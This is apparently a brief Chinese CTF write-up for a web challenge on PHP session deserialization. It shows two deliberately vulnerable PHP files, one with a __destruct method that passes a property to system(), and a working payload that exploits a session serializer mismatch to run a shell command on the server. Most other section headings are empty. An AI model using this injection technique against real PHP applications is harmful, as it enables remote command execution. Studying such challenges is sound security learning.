
# web
### ser2
#session反序列化
- index.php
```php
<?php  
show_source("index.php");  
session_start();  
class Exec{  
    public $commond;  
    function __destruct(){      system($this->commond);  
    }  
  }  
$str = new Exec();  
?>
```

- phpinfo.php
```php
<?php  
error_reporting(0);  
show_source("phpinfo.php");  
ini_set('session.serialize_handler','php_serialize');  
session_start();  
$_SESSION['aaa'] = $_GET['aaa'];  
phpinfo();  
?>
```

*payload*
`/phpinfo.php?aaa=|O:4:"Exec":1:{s:7:"commond";s:16:"ls /var/www/html";}`
发送后访问`index.php` 即可

![!img](https://img.php.cn/upload/article/000/000/067/be69afd137ffe0e5382767c78090c8c8-0.png)


# reverse

# pwn

# crypto

# Misc



# pentest

### 

### 正向代理


---
## *相关wp*




2023-05-28   00:41